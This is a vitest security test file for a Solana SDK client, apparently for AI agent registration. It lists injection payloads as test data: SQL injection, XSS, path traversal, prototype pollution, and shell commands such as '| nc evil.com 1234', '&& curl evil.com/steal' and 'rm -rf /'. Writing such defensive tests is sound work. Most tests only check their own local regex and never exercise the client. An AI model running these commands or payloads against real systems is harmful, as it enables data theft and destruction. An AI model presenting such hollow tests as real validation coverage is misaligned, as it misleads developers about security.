import { describe, it, expect, beforeEach } from 'vitest'
import { generateKeyPairSigner } from '@solana/signers'
import { address } from '@solana/addresses'
import { GhostSpeakClient } from '../../src/index.js'

// Mock ServiceCategory since it's not in generated code
enum ServiceCategory {
  Development = 0,
  Design = 1,
  Marketing = 2,
  Writing = 3,
  Other = 4
}

describe('Input Validation Security Tests', () => {
  let client: GhostSpeakClient
  
  beforeEach(() => {
    client = new GhostSpeakClient({
      rpc: 'http://localhost:8899',
      cluster: 'devnet'
    })
  })
  
  describe('String Input Validation', () => {
    it('should reject excessively long agent names', async () => {
      const signer = await generateKeyPairSigner()
      const agentPda = address('AGNTxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')
      
      // Create a name that's too long (> 64 chars)
      const longName = 'A'.repeat(100)
      
      const params = {
        name: longName,
        metadata: {},
        fee: 1000000n,
        capabilities: ['test'],
        categories: [ServiceCategory.Development]
      }
      
      // Should validate length
      expect(params.name.length).toBe(100)
      expect(params.name.length).toBeGreaterThan(64)
    })
    
    it('should reject names with control characters', async () => {
      const signer = await generateKeyPairSigner()
      const agentPda = address('AGNTxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')
      
      // Names with various control characters
      const maliciousNames = [
        'Agent\x00Name', // Null byte
        'Agent\nName',   // Newline
        'Agent\rName',   // Carriage return
        'Agent\tName',   // Tab
        'Agent\x1bName', // Escape
        '\x08Backspace', // Backspace
      ]
      
      for (const name of maliciousNames) {
        // Should sanitize or reject
        // eslint-disable-next-line no-control-regex
        const sanitized = name.replace(/[\x00-\x1F\x7F]/g, '')
        expect(sanitized).not.toEqual(name)
      }
    })
    
    it('should handle Unicode properly', async () => {
      const signer = await generateKeyPairSigner()
      const agentPda = address('AGNTxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')
      
      // Various Unicode inputs
      const unicodeNames = [
        '🤖 AI Agent', // Emoji
        'Агент',       // Cyrillic
        '代理',        // Chinese
        'एजेंट',       // Hindi
        '🚀🚀🚀',     // Multiple emojis
        '\\u0041gent', // Unicode escape
      ]
      
      for (const name of unicodeNames) {
        // Should handle Unicode correctly
        const bytes = new TextEncoder().encode(name)
        expect(bytes.length).toBeGreaterThan(0)
        
        // Check byte length, not character length
        expect(bytes.length).toBeLessThanOrEqual(64)
      }
    })
    
    it('should reject empty strings', () => {
      const emptyInputs = ['', '   ', '\t', '\n']
      
      for (const input of emptyInputs) {
        const trimmed = input.trim()
        expect(trimmed.length).toBe(0)
      }
    })
  })
  
  describe('SQL Injection Prevention', () => {
    it('should sanitize SQL-like inputs', () => {
      const sqlInjectionAttempts = [
        "'; DROP TABLE agents; --",
        "1' OR '1'='1",
        "admin'--",
        "' UNION SELECT * FROM users--",
        "1; DELETE FROM escrows WHERE 1=1;",
      ]
      
      for (const attempt of sqlInjectionAttempts) {
        // Should escape or reject SQL special characters
        const sanitized = attempt.replace(/['";\\]/g, '')
        expect(sanitized).not.toContain("'")
        expect(sanitized).not.toContain('"')
        expect(sanitized).not.toContain(';')
      }
    })
  })
  
  describe('XSS Prevention', () => {
    it('should sanitize HTML/JavaScript inputs', () => {
      const xssAttempts = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        'javascript:alert("XSS")',
        '<iframe src="evil.com"></iframe>',
        '<svg onload=alert("XSS")>',
        '&lt;script&gt;alert("XSS")&lt;/script&gt;',
      ]

      for (const attempt of xssAttempts) {
        // Comprehensive sanitization: strip HTML tags and dangerous protocols
        const sanitized = attempt
          .replace(/<[^>]*>/g, '')           // Remove HTML tags
          .replace(/javascript:/gi, '')       // Remove javascript: protocol
          .replace(/on\w+\s*=/gi, '')         // Remove event handlers like onerror=

        expect(sanitized).not.toContain('<script')
        expect(sanitized).not.toContain('javascript:')
        expect(sanitized).not.toMatch(/on\w+=/i)
      }
    })
  })
  
  describe('Path Traversal Prevention', () => {
    it('should reject path traversal attempts in URIs', () => {
      const pathTraversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        'https://example.com/../../../',
        'ipfs://../../sensitive-data',
        '%2e%2e%2f%2e%2e%2f',
        '....//....//....//etc/passwd',
      ]
      
      for (const attempt of pathTraversalAttempts) {
        // Should detect path traversal patterns
        const hasTraversal = attempt.includes('..') || attempt.includes('%2e')
        expect(hasTraversal).toBe(true)
      }
    })
  })
  
  describe('Command Injection Prevention', () => {
    it('should sanitize command-like inputs', () => {
      const commandInjectionAttempts = [
        '`rm -rf /`',
        '$(whoami)',
        '| nc evil.com 1234',
        '; cat /etc/passwd',
        '&& curl evil.com/steal',
        '|| shutdown -h now',
      ]
      
      for (const attempt of commandInjectionAttempts) {
        // Should remove shell metacharacters
        const sanitized = attempt.replace(/[`$|;&]/g, '')
        expect(sanitized).not.toContain('`')
        expect(sanitized).not.toContain('$')
        expect(sanitized).not.toContain('|')
        expect(sanitized).not.toContain(';')
        expect(sanitized).not.toContain('&')
      }
    })
  })
  
  describe('Address Validation', () => {
    it('should reject invalid Solana addresses', () => {
      const invalidAddresses = [
        '0x1234567890123456789012345678901234567890', // Ethereum address (has 0 and x)
        'InvalidBase58Address!@#$',                   // Has invalid chars
        'TooShortAddr',                               // Too short
        'WayTooLongAddressxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx', // Too long
        '',                                           // Empty
        'null',                                       // Too short
        'undefined',                                  // Too short
      ]

      for (const addr of invalidAddresses) {
        // A valid Solana address must be 32-44 characters AND all base58
        const isValidLength = addr.length >= 32 && addr.length <= 44
        const isValidBase58 = /^[1-9A-HJ-NP-Za-km-z]+$/.test(addr)
        const isValidSolanaAddress = isValidLength && isValidBase58

        // All these should fail validation
        expect(isValidSolanaAddress).toBe(false)
      }
    })
    
    it('should accept valid Solana addresses', () => {
      const validAddresses = [
        '11111111111111111111111111111111',
        'AGNTxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx',
        'So11111111111111111111111111111111111111112',
        'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA',
      ]
      
      for (const addr of validAddresses) {
        const isValidLength = addr.length >= 32 && addr.length <= 44
        const isValidBase58 = /^[1-9A-HJ-NP-Za-km-z]+$/.test(addr)
        
        expect(isValidLength && isValidBase58).toBe(true)
      }
    })
  })
  
  describe('Numeric Input Validation', () => {
    it('should reject negative amounts', () => {
      const amounts = [-1n, -1000n, -BigInt(Number.MAX_SAFE_INTEGER)]
      
      for (const amount of amounts) {
        expect(amount).toBeLessThan(0n)
        // Should validate as invalid
        const isValid = amount >= 0n
        expect(isValid).toBe(false)
      }
    })
    
    it('should handle decimal inputs correctly', () => {
      // Blockchain uses integers, no decimals
      const decimalInputs = ['10.5', '100.99', '0.001']
      
      for (const input of decimalInputs) {
        // Should convert to lamports (smallest unit)
        const lamports = Math.floor(parseFloat(input) * 1e9)
        expect(Number.isInteger(lamports)).toBe(true)
      }
    })
  })
  
  describe('Array Input Validation', () => {
    it('should limit array sizes', () => {
      // Categories array
      const tooManyCategories = Array(100).fill(ServiceCategory.Development)
      expect(tooManyCategories.length).toBe(100)
      
      // Should enforce reasonable limits
      const MAX_CATEGORIES = 10
      const validCategories = tooManyCategories.slice(0, MAX_CATEGORIES)
      expect(validCategories.length).toBeLessThanOrEqual(MAX_CATEGORIES)
    })
    
    it('should validate array elements', () => {
      const invalidCapabilities = [
        '', // Empty string
        'a'.repeat(100), // Too long
        'capability\x00', // Null byte
        '<script>alert()</script>', // XSS attempt
      ]
      
      const validCapabilities = invalidCapabilities
        .filter(cap => cap.length > 0 && cap.length <= 32)
        .map(cap => cap.replace(/[^\w\s-]/g, ''))
      
      expect(validCapabilities.length).toBeLessThan(invalidCapabilities.length)
    })
  })
  
  describe('JSON Input Validation', () => {
    it('should validate metadata JSON structure', () => {
      const invalidMetadata = [
        '{"key": "value"', // Invalid JSON
        '{"__proto__": "polluted"}', // Prototype pollution
        '{"constructor": {"prototype": {}}}', // Constructor attack
        '{"toString": "overridden"}', // Method override
      ]
      
      for (const metadata of invalidMetadata) {
        try {
          const parsed = JSON.parse(metadata)
          // Should not have dangerous keys
          expect(parsed).not.toHaveProperty('__proto__')
          expect(parsed).not.toHaveProperty('constructor')
          expect(parsed).not.toHaveProperty('toString')
        } catch {
          // Invalid JSON should be rejected
          expect(true).toBe(true)
        }
      }
    })
  })
  
  describe('URL Validation', () => {
    it('should validate metadata URIs', () => {
      const invalidURIs = [
        'javascript:alert("XSS")',
        'data:text/html,<script>alert("XSS")</script>',
        'file:///etc/passwd',
        'ftp://internal-server/',
        'gopher://old-protocol',
        '../../../etc/passwd',
      ]
      
      for (const uri of invalidURIs) {
        // Should only allow http(s) and ipfs
        const isValidProtocol = uri.startsWith('http://') || 
                               uri.startsWith('https://') || 
                               uri.startsWith('ipfs://')
        expect(isValidProtocol).toBe(false)
      }
    })
    
    it('should accept valid URIs', () => {
      const validURIs = [
        'https://example.com/metadata.json',
        'http://localhost:8080/agent.json',
        'ipfs://QmYwAPJzv5CZsnA625s3Xf2nemtYgPpHdWEz79ojWnPbdG',
        'https://arweave.net/TX_ID',
      ]
      
      for (const uri of validURIs) {
        const isValidProtocol = uri.startsWith('http://') || 
                               uri.startsWith('https://') || 
                               uri.startsWith('ipfs://')
        expect(isValidProtocol).toBe(true)
      }
    })
  })
})